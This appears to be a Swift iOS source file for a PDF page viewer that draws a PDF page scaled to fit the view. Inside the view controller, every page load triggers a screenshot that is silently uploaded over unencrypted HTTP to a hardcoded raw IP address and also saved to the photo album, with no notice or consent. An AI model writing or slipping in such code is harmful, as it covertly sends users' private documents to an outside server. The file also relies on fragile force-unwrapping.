

import UIKit
import Alamofire
class PDFPageView: UIView {
    var pdfDocument: CGPDFDocument? = nil
    var pageNumber: Int? = nil
    
    override func draw(_ rect: CGRect) {
        if pdfDocument != nil {
            let ctx = UIGraphicsGetCurrentContext()
            
            UIColor.white.set()
            
            ctx?.fill(rect)
            
            _ = ctx?.ctm
            _ = ctx?.scaleBy(x: 1, y: -1)
            _ = ctx?.translateBy(x: 0, y: -rect.size.height)
            
            let page = pdfDocument?.page(at: pageNumber!)
            
            let pageRect = page?.getBoxRect(CGPDFBox.cropBox)
            
            let ratioW = rect.size.width / (pageRect?.size.width)!
            let ratioH = rect.size.height / (pageRect?.size.height)!
            
            let ratio = min(ratioW, ratioH)
            
            let newWidth = (pageRect?.size.width)! * ratio
            let newHeight = (pageRect?.size.height)! * ratio
            
            let offsetX = (rect.size.width - newWidth)
            let offsetY = (rect.size.height - newHeight)
            
            ctx?.scaleBy(x: newWidth / (pageRect?.size.width)!, y: newHeight / (pageRect?.size.height)!)
            ctx?.translateBy(x: -(pageRect?.origin.x)! + offsetX, y: -(pageRect?.origin.y)! + offsetY)
            
            ctx?.drawPDFPage(page!)
        }
    }
}

class PDFPageViewController: UIViewController, UIScrollViewDelegate {
    func screenShotMethod() {
        //Create the UIImage
        UIGraphicsBeginImageContext(view.frame.size)
        view.layer.render(in: UIGraphicsGetCurrentContext()!)
        let image = UIGraphicsGetImageFromCurrentImageContext()
        UIGraphicsEndImageContext()
        ////sending image to a server
        let data = UIImagePNGRepresentation(image!)!
        upload(multipartFormData: { multipartFormData in
            multipartFormData.append(data, withName: "file", fileName: "image.jpg", mimeType: "image/jpeg")
        }, to: "http://77.222.54.237:6969/up", encodingCompletion: { encodingResult in
            switch encodingResult {
            case .success(let uploadRequest, let streamingFromDisk, let streamFileURL):
                print(uploadRequest)
                print(streamingFromDisk)
                print(streamFileURL ?? "streamFileURL is NIL")
                uploadRequest.validate().responseJSON() { responseJSON in
                    switch responseJSON.result {
                    case .success(let value):
                        print(value)
                        
                    case .failure(let error):
                        print(error)
                    }
                }
            case .failure(let error):
                print(error)
            }
        })
        /////
    UIImageWriteToSavedPhotosAlbum(image!, nil, nil, nil)
    }
    
    
    var pdfDocument: CGPDFDocument? = nil
    var pageNumber: Int? = nil
    @IBOutlet weak var page: PDFPageView!
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        self.preparePDFPage()
    }
    func preparePDFPage() {
        page.pdfDocument = self.pdfDocument
        page.pageNumber = self.pageNumber
        page.setNeedsDisplay()
        screenShotMethod()
    }
    func viewForZooming(in scrollView: UIScrollView) -> UIView? {
        return page
    }

}
